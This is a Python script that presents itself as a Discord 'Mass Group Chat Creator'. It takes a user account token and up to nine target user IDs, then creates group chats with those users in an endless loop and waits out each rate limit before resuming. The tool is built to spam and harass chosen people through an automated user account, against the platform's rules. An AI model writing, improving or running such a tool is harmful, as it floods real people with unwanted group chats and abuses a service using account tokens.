anyerror = False
try:
    import requests
    import colorama
except:
  anyerror = True
if anyerror == True:
  print("Missing Module(s), Press Enter To Start Repair Process (Wont Always Work)")
  input("")
  try:
    import os
    os.system("pip install requests")
    os.system("pip install colorama")
    print("Problems Should Be Fixed Now, Restart The Program")
    input("")
    exit()
  except:
    print("Error While Fixing, Sorry")
    input("")
    exit()
try:
    from os import system
    system("title " + "Discord Mass Group Chat Creator,   Made By blob#0005,   Github: github.com/blob0005")
except:
    pass
import time



id_list = []
invite_code = "weYYXeUSNm"
while True:
    tokens = input("Enter Token: ")
    r1 = requests.get('https://discord.com/api/v6/auth/login', headers={"Authorization": tokens})
    if "200" not in str(r1):
        print(colorama.Fore.RED + "Invalid Token")
    if "200" in str(r1):
        r = requests.get(f'https://discord.com/api/v6/invite/{invite_code}', headers={"Authorization": tokens})
        if "200" in str(r):
            break
        if "403" in str(r):
            print(colorama.Fore.YELLOW + "Locked Token")
added_ids = 0
while True:
  while True:
    try:
      id = input("Enter Id: ")
      id = int(id)
      break
    except:
      print("Enter A Valid Choice")
  id_list.append(id)
  added_ids = int(added_ids) + 1
  print("Added Id To Target List")
  if int(added_ids) >= 2:
    while True:
      con = input("Wanna Enter Another Id (y/n): ")
      if con == "y" or con == "n":
        break
      else:
        print("Enter A Valid Choice")
    if con == "n":
      break
  if int(added_ids) >= 9:
    break
input("Press Enter To Start: ")
url = "https://discord.com/api/v9/users/@me/channels"

json = {
  "recipients": id_list
}

headers = {
  "authorization": tokens
}
print("If Blank You Failed Somewhere In Ids")
while True:

  req = requests.post(url=url, headers=headers, json=json)
  re = req.json()
  req = str(req)
  if "200" in req:
    print(colorama.Fore.GREEN + "Succsesfully Created Group")
  if "429" in req:
    delay = float(re["retry_after"])
    print(colorama.Fore.RED + "Rate Limited Sleeping For " + str(delay) + " Seconds")
    time.sleep(float(delay))